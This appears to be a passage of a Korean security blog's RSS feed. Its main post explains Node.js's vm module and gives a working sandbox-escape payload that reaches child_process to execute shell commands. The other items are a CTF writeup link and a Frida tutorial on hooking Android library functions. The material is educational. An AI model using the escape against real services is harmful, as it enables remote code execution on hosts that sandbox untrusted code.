      <content:encoded><![CDATA[<h3 id="1-Node-JS"><a href="#1-Node-JS" class="headerlink" title="[1] Node.JS"></a>[1] Node.JS</h3><p>Node.JS는 네트워크 애플리케이션(서버 사이드) 개발에 사용되는 소프트웨어 플랫폼입니다.</p><p>Javascript 언어를 사용하며, Non-blocking I/O와 단일 스레드 이벤트 루프를 사용하여 높은 처리 성능을 가지고 있습니다.</p><p>또한, HTTP 라이브러리를 내장하고 있어 웹 서버 구동에 필요한 Apache, Nginx와 같이 별도의 소프트웨어를 필요로 하지 않습니다.</p><hr><h3 id="2-Sandbox"><a href="#2-Sandbox" class="headerlink" title="[2] Sandbox"></a>[2] Sandbox</h3><p>Sandbox란, 외부에서 코드를 실행하거나 신뢰할 수 없는 코드를 안전하게 실행할 수 있도록 메인 시스템과 격리된 환경에서 실행되는 환경입니다.</p><p>Node.JS 기준으로는 <code>vm</code> 모듈이 존재하는데, 해당 모듈에 대해서는 아래 목차에서 좀 더 세심하게 다뤄보겠습니다.</p><h3 id="3-Node-JS-VM-Module"><a href="#3-Node-JS-VM-Module" class="headerlink" title="[3] Node.JS VM Module"></a>[3] Node.JS VM Module</h3><p>우선, Node JS에서는 임의의 JS 코드를 안전한 환경에서 실행될 수 있도록 하기 위해 <code>VM</code> 모듈을 제공하고</p><p>있습니다. 해당 모듈은 V8 가상 머신 컨택스트 내에서 코드를 컴파일하고 실행합니다.</p><p>물론, 해당 모듈이 안전하다고 볼수도 없습니다. 신뢰할 수 없는 코드나 임의의 코드를 실행할 수 있게 하지만 이러한 코드에서</p><p>Sandbox 환경을 escape하는 경우가 발생할 때는 시스템에 치명적인 영향을 미칠 수 있기 때문입니다.</p><p>아래는 VM 모듈에 대한 공식 문서 Sample Code 자료입니다.</p><pre><code class="js">const vm = require(&#39;vm&#39;);const x = 1;const context = &#123; x: 2 &#125;;vm.createContext(context); // Contextify the object.const code = &#39;x += 40; var y = 17;&#39;;// `x` and `y` are global variables in the context.// Initially, x has the value 2 because that is the value of context.x.vm.runInContext(code, context);console.log(context.x); // 42console.log(context.y); // 17console.log(x); // 1; y is not defined.</code></pre><h3 id="4-Run-VM-Module-Script"><a href="#4-Run-VM-Module-Script" class="headerlink" title="[4] Run VM Module Script"></a>[4] Run VM Module Script</h3><p>위 예제처럼, VM 모듈을 사용하여 스크립트를 실행하는 방법은 공식 문서에 함수 표현식 옵션이 몇 가지 존재합니다.</p><ul><li>script.runInContext(contextifiedObject[, options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;)const context = &#123;  id: &#39;name&#39;,  price: 10000&#125;;const script = new vm.Script(&#39;price += 10000&#39;);vm.createContext(context);script.runInContext(context);console.log(context);/** result : 20000 **/</code></pre><ul><li>script.runInNewContext([contextObject[, options]])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;)const script = new vm.Script(&#39;variable = &quot;test&quot;&#39;);const context = [&#123;&#125;, &#123;&#125;];context.forEach((context) =&gt; &#123;    script.runInNewContext(context);&#125;);console.log(context);/** result [ &#123; variable: &#39;test&#39; &#125;, &#123; variable: &#39;test&#39; &#125; ] **/</code></pre><ul><li>script.runInThisContext([options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;)global.variable = 0;const script = new vm.Script(&#39;variable += 1&#39;);for(let i=0; i&lt;1000; i++)&#123;    script.runInThisContext();&#125;console.log(variable);/** result : 1000 **/</code></pre><ul><li>vm.createContext([contextObject[, options]])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);global.globalVar = 3;const context = &#123; globalVar: 1 &#125;;vm.createContext(context);vm.runInContext(&#39;globalVar *= 2;&#39;, context);console.log(context);// Prints: &#123; globalVar: 2 &#125;console.log(global.globalVar);// Prints: 3</code></pre><ul><li>vm.runInContext(code, contextifiedObject[, options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);const obj = &#123; globalvar: 1 &#125;;vm.createContext(obj);for(let i=0; i&lt;500; i++)&#123;    vm.runInContext(&#39;globalvar += 1&#39;, obj);&#125;console.log(obj);/** result : 501 **/</code></pre><ul><li>vm.runInNewContext(code[, contextObject[, options]])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);const contextObject = &#123;  animal: &#39;cat&#39;,  count: 2&#125;;vm.runInNewContext(&#39;count += 1; name = &quot;kitty&quot;&#39;, contextObject);console.log(contextObject);// Prints: &#123; animal: &#39;cat&#39;, count: 3, name: &#39;kitty&#39; &#125;</code></pre><ul><li>vm.runInThisContext(code[, options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);let localVar = &#39;initial value&#39;;const vmResult = vm.runInThisContext(&#39;localVar = &quot;vm&quot;;&#39;);console.log(`vmResult: &#39;$&#123;vmResult&#125;&#39;, localVar: &#39;$&#123;localVar&#125;&#39;`);// Prints: vmResult: &#39;vm&#39;, localVar: &#39;initial value&#39;const evalResult = eval(&#39;localVar = &quot;eval&quot;;&#39;);console.log(`evalResult: &#39;$&#123;evalResult&#125;&#39;, localVar: &#39;$&#123;localVar&#125;&#39;`);// Prints: evalResult: &#39;eval&#39;, localVar: &#39;eval&#39;</code></pre><h3 id="5-Escaping-for-VM-Module"><a href="#5-Escaping-for-VM-Module" class="headerlink" title="[5] Escaping for VM Module"></a>[5] Escaping for VM Module</h3><p>최근에 CTF를 자주 참여하는 편인데 이번 zer0ctf 2021 CTF에서 해당 문제가 나왔었는데, 풀이 관련은 추후 정리가 완료되는대로 별도의 포스팅을 해볼 예정입니다.</p><p>우선 [2]에서도 설명 했듯이 VM 모듈을 사용할 때 신뢰할 수 없는 코드, 임의의 코드를 실행할 수 있게 되는 경우 이러한 환경을 탈출할 수 있고,</p><p>VM Context 외부의 객체를 통해 시스템에 치명적인 영향을 끼칠 수 있습니다.</p><p>아래는 일반적인 vm script 코드이며, bypass가 가능한 상황과 비교해보겠습니다.</p><pre><code class="js">const vm = require(&#39;vm&#39;);const msg = vm.runInNewContext(`&quot;use strict&quot;; let a = &quot;hello world&quot;; a;`, Object.create(null), &#123;timeout: 500&#125;);console.log(msg);</code></pre><p><code>escape1.js</code></p><pre><code class="js">const vm = require(&#39;vm&#39;);const cmd = vm.runInNewContext(`&quot;use strict&quot;; this.constructor.constructor(&#39;return this.process&#39;)()`, Object.create(null), &#123;timeout: 500&#125;);console.log(cmd);</code></pre><p><code>escape_rce.js</code></p><pre><code class="js">const vm = require(&#39;vm&#39;);const cmd = vm.runInNewContext(`&quot;use strict&quot;; const process = this.constructor.constructor(&#39;return this.process&#39;)(); process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat ./hellopoc&#39;).toString()`);console.log(cmd);</code></pre><img src="/img/post/nodejs_escape/1.png" class="lazyload" data-srcset="/img/post/nodejs_escape/1.png" srcset="data:image/png;base64,666"><p>위와 같이 sandbox 환경을 escape하여 RCE를 진행할 수 있게 됩니다.</p><p>물론 해당 방법 이외에도 다양한 bypass technology 들이 존재하나, 추후 여건이 되면 심화적인 접근을 다뤄보겠습니다.</p><p>참고하고 공부할 만한 링크는 아래 정리해두겠습니다.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://nodejs.org/api/vm.html">https://nodejs.org/api/vm.html</a></p></li><li><p><a href="https://millermedeiros.github.io/mdoc/examples/node_api/doc/vm.html">https://millermedeiros.github.io/mdoc/examples/node_api/doc/vm.html</a></p></li><li><p><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html">https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html</a></p></li><li><p><a href="https://blog.netspi.com/escape-nodejs-sandboxes/">https://blog.netspi.com/escape-nodejs-sandboxes/</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Research/">Research</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/NodeJS/">NodeJS</category>
      
      <category domain="https://blog.jhyeon.dev/tags/V8-Engine/">V8 Engine</category>
      
      <category domain="https://blog.jhyeon.dev/tags/VM-Module/">VM Module</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Sandbox/">Sandbox</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Code-Execution/">Code Execution</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>AeroCTF 2021 Write up</title>
      <link>https://blog.jhyeon.dev/2021/02/28/aeroctf2021-210228/</link>
      <guid>https://blog.jhyeon.dev/2021/02/28/aeroctf2021-210228/</guid>
      <pubDate>Sat, 27 Feb 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;이번에 팀원분들과 함께 CTF를 진행하였습니다. 제가 푼 문제는 아래 노션에 풀이가 작성되어 있습니다!&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://public.jhyeon.dev/e08f5543-0769-4404-a7fa-2e7b5a28b66e&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>이번에 팀원분들과 함께 CTF를 진행하였습니다. 제가 푼 문제는 아래 노션에 풀이가 작성되어 있습니다!</p><p><a href="https://public.jhyeon.dev/e08f5543-0769-4404-a7fa-2e7b5a28b66e">https://public.jhyeon.dev/e08f5543-0769-4404-a7fa-2e7b5a28b66e</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/AeroCTF2021/">AeroCTF2021</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/02/28/aeroctf2021-210228/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Frida를 통한 앱 내부 라이브러리 후킹 방법</title>
      <link>https://blog.jhyeon.dev/2021/02/22/frida-hook1-210222/</link>
      <guid>https://blog.jhyeon.dev/2021/02/22/frida-hook1-210222/</guid>
      <pubDate>Sun, 21 Feb 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;이번에, 앱을 분석해보다가 특정 라이브러리에 대해 후킹을 해야 하는 상황이 있었는데, 그 방법론을 기억에 남기고자&lt;/p&gt;
&lt;p&gt;아래 작성합니다.&lt;/p&gt;
&lt;p&gt;우선, 뭐든지 공식 문서에는 답이 매우 잘 나와있습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;h</description>
        
      
      
      
      <content:encoded><![CDATA[<p>이번에, 앱을 분석해보다가 특정 라이브러리에 대해 후킹을 해야 하는 상황이 있었는데, 그 방법론을 기억에 남기고자</p><p>아래 작성합니다.</p><p>우선, 뭐든지 공식 문서에는 답이 매우 잘 나와있습니다.</p><p><a href="https://frida.re/docs/javascript-api/#interceptor">https://frida.re/docs/javascript-api/#interceptor</a></p><p>해당 라인을 보시면, <code> Interceptor.attach </code> 를 통해서 특정 함수의 호출을 catch할 수 있고,</p><p>함수의 주소를 가져오거나, 후킹을 진행할 수 있게됩니다.</p><p>아래는 예제 코드입니다.</p><pre><code class="java">Interceptor.attach(Module.findExportByName(&quot;라이브러리 파일&quot;, &quot;함수명&quot;), &#123;    onEnter: function(args)&#123;        this.input = Memory.readUtf8String(args[0]);            //input    &#125;,    onLeave: function(retval)&#123;        return 0;    &#125;&#125;</code></pre><p>물론 dlopen 함수 후킹을 통해 라이브러리가 로드되는 시점을 후킹할 수도 있습니다.</p><pre><code class="java">Interceptor.attach(Module.findExportByName(null, &quot;dlopen&quot;), &#123;    onEnter: function(args)&#123;        this.input = Memory.readUtf8String(args[0]);        if(this.input.indexOf(&quot;lib64.so&quot;) !== -1)&#123;            console.log(&quot;lib64.so Loaded!&quot;);            Thread.sleep(5);        &#125;    &#125;,    onLeave: function(retval)&#123;        return 0;    &#125;&#125;</code></pre><p>이러한 방법도 있고 앞으로 앱 관련 분석을 해보면서, 조금 더 심화적인 것들을 많이 연구해보고 또 글을 쓰도록 하겠습니다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Application/">Application</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Frida/">Frida</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Hooking/">Hooking</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/02/22/frida-hook1-210222/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
